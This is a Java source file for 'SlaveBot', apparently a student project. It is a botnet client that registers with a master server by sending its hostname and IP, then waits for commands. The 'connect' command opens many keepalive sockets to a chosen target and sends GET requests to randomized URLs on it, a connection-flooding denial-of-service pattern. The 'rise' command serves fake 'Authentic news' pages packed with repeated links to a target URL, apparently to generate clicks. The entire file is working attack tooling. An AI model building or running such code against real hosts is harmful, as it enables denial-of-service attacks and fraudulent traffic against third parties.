import java.net.*;
import java.io.*;
import java.net.Socket;
import java.lang.*;
import java.util.*;
import java.lang.Math;
import java.net.URL;
import java.util.Random;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class SlaveBot implements Runnable
{

  private class SocketInfo
  {
    public Socket target;
    public String ipAddress;
    public int portNo;
  }

private int Portnum;
private String hostip;
private Thread slavethread;
int listenPort;
Socket target=null;

ArrayList<SocketInfo> sockets;

public void start()
{
  if (slavethread==null)
  {
    slavethread = new Thread(this,"Slave");
    slavethread.start();
  }
}//end of start
public SlaveBot(int Portnum, String host)
 {
    this.Portnum = Portnum;
    this.hostip = host;
    listenPort = (int)(Math.random()*(65535-1024)+1024);
    this.sockets = new ArrayList<SocketInfo>();
}

@Override
public void run()
{
register(Portnum);
listen();
}
public void listen()
{
  ServerSocket socket = null;
  try
   {
     socket=new ServerSocket(listenPort);
  } catch(Exception e) {
      System.out.println("Exp: "  +e.getMessage());
  }
  while(true)
  {
  try  {
  Socket client = socket.accept();
  InputStreamReader IR = new InputStreamReader(client.getInputStream());
  BufferedReader bf = new BufferedReader(IR);
  String message = bf.readLine();
  String targetip;
  int targetipnum;
  int connections;
  int fg;

  String[] info = message.split(" ");

  switch(info[0])
  {
      case "connect":
      targetip=info[1];
      targetipnum=Integer.parseInt(info[2]);
      connections=Integer.parseInt(info[3]);
      fg=Integer.parseInt(info[5]);
      connectcontrol(targetip,targetipnum,connections,info[4],fg);
      break;
      case "disconnect":
      targetip=info[1];
      targetipnum=Integer.parseInt(info[2]);
      disconnectcontrol(targetip,targetipnum);
      break;
      case "rise":
      System.out.println("rise-fake-url");
      targetip=info[2];
      targetipnum=Integer.parseInt(info[1]);
      int m=1;
      riseurl(targetipnum,targetip);
      break;
      case "down":
      System.out.println("down-fake-url");
      targetip=info[2];
      targetipnum=Integer.parseInt(info[1]);
      downurl(targetipnum,targetip);
      break;
      default:
        System.out.println("Invalid case");
        break;
  }
//    if(message != null)
//    {
//    PrintStream ps = new PrintStream(client.getOutputStream());
//    ps.println("message recieved");
//    }
}catch(Exception e) {
  break;
//  System.out.println("Exception: " + e.getMessage());
}
}
try {
  socket.close();
  }
catch(Exception e) {

}

}

public void connectcontrol(String targetip,int targetipnum,int connections, String kal1,int flag)
{
  String kal3="";
  for(int i=0;i<connections;i++)
  {
      try{
        target = new Socket(targetip,targetipnum);
        PrintStream ps = new PrintStream(target.getOutputStream());
        PrintWriter ps2 = new PrintWriter(target.getOutputStream(),true);
        ps2.println("reached target");
        SocketInfo socketInfo = new SocketInfo();
        if(kal1.equals("active"))
        {
          System.out.println("keepalive");
          boolean keepalive=true;
          target.setKeepAlive(keepalive);
        }
        else if(flag==1)
        {
          String kal2="";
          if(kal1.contains("url="))
          {
            kal3=kal1.replace("url=","");
          }
           Random random = new Random();
           String char1 = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ234567890!@#$";
           int length=random.nextInt(10 - 1 + 1) + 1;
              StringBuilder tokenused = new StringBuilder(length);
             for (int i1 = 0; i1 < length; i1++)
             {
                 tokenused.append(char1.charAt(random.nextInt(char1.length())));
             }
             String url=tokenused.toString();
             kal2="http://"+targetip+kal3+url;
             System.out.println("Machine connected -" + target.getInetAddress().getLocalHost());
             //System.out.println("connected to-"+kal2);
             connecttourl(kal2);
        }
        socketInfo.target = target;
        socketInfo.ipAddress = targetip;
        socketInfo.portNo = targetipnum;
        sockets.add(socketInfo);
}
catch (IOException e)
{
  System.out.println("Exception: " + e.getMessage());
}
}
}
public void connecttourl(String httpurl)
{
  //System.out.println(httpurl);
  try{
  String webbrowser="Mozilla/5.0";
  URL obj1 = new URL(httpurl);
  HttpURLConnection connecttourl =(HttpURLConnection)obj1.openConnection();
  connecttourl.setRequestMethod("GET");
  connecttourl.setRequestProperty("User-Agent",webbrowser);
//int code = connecttourl.getResponseCode();
//System.out.println("Code: " + code);
  BufferedReader inputresponse = new BufferedReader(new InputStreamReader(connecttourl.getInputStream()));
  String input="";
  StringBuffer res = new StringBuffer();
  while ((input = inputresponse.readLine()) != null)
  {
    res.append(input);
  }
  //System.out.println("Response: " + res.toString());
  inputresponse.close();
}
catch (IOException e)
{
}
}
public void disconnectcontrol(String targetip,int targetipnum)throws Exception
{
  System.out.println("disconnect");
  ArrayList<Integer> removeList = new ArrayList<Integer>();

  for(int z=0;z<sockets.size();z++)
  {
    if(targetip.equals(sockets.get(z).ipAddress))
    {
      if(targetipnum!=-1)
      {
        if(targetipnum==sockets.get(z).portNo)
        {
          sockets.get(z).target.close();
          removeList.add(z);
        }
      }
      else
      {
        sockets.get(z).target.close();
        removeList.add(z);
      }
    }
  }

Collections.sort(removeList,Collections.reverseOrder());

for(Integer index: removeList) {
    sockets.remove(index);
}

}

private String getParam(String requestParams)
{
  Pattern p = Pattern.compile("GET(.*)HTTP/1.1");
  Matcher m = p.matcher(requestParams);
  if(m.find())
  {
    String[] param = m.group(0).split(" ");
    return param[1].replace("/", "");
  }
  return "";
}

public void riseurl(int targetipnum,String targetip)
{
  System.out.println(targetip);
  try
  {
    ServerSocket serverSocketrise = new ServerSocket(targetipnum);
    Socket clientSocketrise=serverSocketrise.accept();
    riserise r=new riserise();
    r.sock=serverSocketrise;
    r.sock1=clientSocketrise;
    while(true)
    {
  clientSocketrise = serverSocketrise.accept();
  BufferedReader in= new BufferedReader(new InputStreamReader(clientSocketrise.getInputStream()));
  String line= "";
  String requestParams = "";
  while((line = in.readLine())!=null)
  {
    if(line.equals(""))
    {
      break;
    }
    requestParams += line;
    System.out.println(line);
  }
  String param = this.getParam(requestParams);
  PrintWriter out = new PrintWriter(clientSocketrise.getOutputStream());
  if(param.equals("p2"))
   {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 1 </p>");
    out.println("<body bgcolor= #ffccb3>");
    out.println("<a href=http://localhost:" + targetipnum + "/p4>PAGE 3!!!</a><br>");
    out.println("</body>");
    out.println("<body bgcolor= #dfff80>");
    out.println("<a href=http://localhost:" + targetipnum + "/p5>PAGE 4!!!</a><br>");
    out.println("<br>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links<br>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("</body>");
    out.flush();
  }
  else if(param.equals("p3"))
   {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 1 </p>");
    out.println("<p> Important,check this out!</p>");
    out.println("<body bgcolor=#E6E6FA>");
    out.println("<a href=http://localhost:" + targetipnum + "/p6>PAGE 5!!!</a><br>");
    out.println("<a href=http://localhost:" + targetipnum + "/p7>PAGE 6!!!</a><br>");
    out.println("</body>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links ");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.flush();
  }
  else if(param.equals("p4"))
  {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 2 </p>");
    out.println("<body bgcolor= #ffff80");
    out.println("<p> Important,check this out!</p>");
    out.println("<a href=http://localhost:" + targetipnum + "/p8>final 1!!!</a><br>");
    out.println("<a href=http://localhost:" + targetipnum + "/p9>final 2!!!</a><br>");
    out.println("<br>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links <br>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.flush();
  }
  else if(param.equals("p5"))
  {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 2 </p>");
    out.println("<p> Important,check this out!</p>");
    out.println("<body bgcolor=#80bfff>");
    out.println("<a href=http://localhost:" + targetipnum + "/p10>final 3!!!</a><br>");
    out.println("<a href=http://localhost:" + targetipnum + "/p11>final 4!!!</a><br>");
    out.println("</body>");
    out.println("<br>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links <br>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.flush();
  }
  else if(param.equals("p6"))
  {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 2 </p>");
    out.println("<p> Important,check this out!</p>");
    out.println("<body bgcolor=#ffffff>");
    out.println("<a href=http://localhost:" + targetipnum + "/p12>final 5!!!</a><br>");
    out.println("<a href=http://localhost:" + targetipnum + "/p13>final 6!!!</a><br>");
    out.println("</body>");
    out.println("<br>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links <br>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.flush();
  }
  else if(param.equals("p7"))
  {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<p> level 2 </p>");
    out.println("<body bgcolor=#6666ff");
    out.println("<p> Important,check this out!</p>");
    out.println("<a href=http://localhost:" + targetipnum + "/p14>final 7!!!</a><br>");
    out.println("<a href=http://localhost:" + targetipnum + "/p15>final 8!!!</a><br>");
    out.println("</body>");
    out.println("<br>");
    out.println("this is a page with lot of info. Authentic news!!! Please click on any links <br>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.flush();
  }
  else if(param.equals("p8")||param.equals("p9")||param.equals("p10")||param.equals("p11")||param.equals("p12")||param.equals("p13")||param.equals("p14")||param.equals("p15"))
  {
    out.println("HTTP/1.1 200 OK");
    out.println("Content-Type: text/html");
    out.println("\r\n");
    out.println("<h1><center>Final Page</center></h1><br>");
    out.println("<body bgcolor=#ffbf80>");
    out.println("<p> 3rd page </p>");
    out.println("<bold><p> Important,check this out!</p></bold>");
    out.println("<br>");
    if(targetip.contains("http://")||targetip.contains("https://"))
    {
      targetip=targetip;
    }
    else
    {
      targetip="http://"+targetip;
    }
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
    out.println("</body>");
    out.flush();
  }
  else
  {
  System.out.println("before http");
  out.println("HTTP/1.1 200 OK");
  out.println("Content-Type: text/html");
  out.println("\r\n");
  out.println("<body bgcolor=#e0ebeb>");
  out.println("<h1><center> 206 Project part-3 </center></h1><br>");
  out.println("<a href=http://localhost:" + targetipnum + "/p2>PAGE 1!!!</a><br>");
  out.println("<a href=http://localhost:" + targetipnum + "/p3>PAGE 2!!!</a><br>");
  out.println("this is a page with lot of info. Authentic news!!! Please click on any links <br>");
  out.println("<br>");
  if(targetip.contains("http://")||targetip.contains("https://"))
  {
    targetip=targetip;
  }
  else
  {
    targetip="http://"+targetip;
  }
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("<a href=" + targetip + ">Check This out!!!</a><br>");
  out.println("</body>");
  out.flush();
}
}
  }
catch(Exception e)
{
  System.out.println("Exception:" + e.getMessage());
}
}
public void downurl(int targetipnum,String targetip)throws Exception
{
  riserise m=new riserise();
  m.sock.close();
  m.sock1.close();
}
public void register(int portNum) {

  try {
    Socket slave = new Socket(hostip,Portnum);
    PrintStream ps = new PrintStream(slave.getOutputStream());
    InetAddress address = InetAddress.getLocalHost();
    String hostIP = address.getHostAddress();
    String timeanddate = new SimpleDateFormat("yyyyMMdd").format(Calendar.getInstance().getTime());
    String Host_Name = address.getHostName();
    PrintWriter ps1 = new PrintWriter(slave.getOutputStream(),true);
    ps1.println(Host_Name + " " + hostIP + " " +listenPort+" " + timeanddate);
    slave.close();
  }
   catch(Exception e)
   {
   }
}

public static void main(String[] args)throws Exception
{
  String host="";
  String s;
  int PortNo=0;
  if(args.length==4)
  {
    for(int i=0;i<4;i=i+2)
    {
    s=args[i];
    switch(s)
    {
      case "-h":
      host=args[i+1];
      break;
      case "-p":
      PortNo=Integer.parseInt(args[i+1]);
      break;
      default:
      System.out.println("Enter valid input");
      break;
    }
  }
}
SlaveBot cl =new SlaveBot(PortNo, host);
cl.start();
}
}
class riserise
{
  public ServerSocket sock;
  public Socket sock1;
}
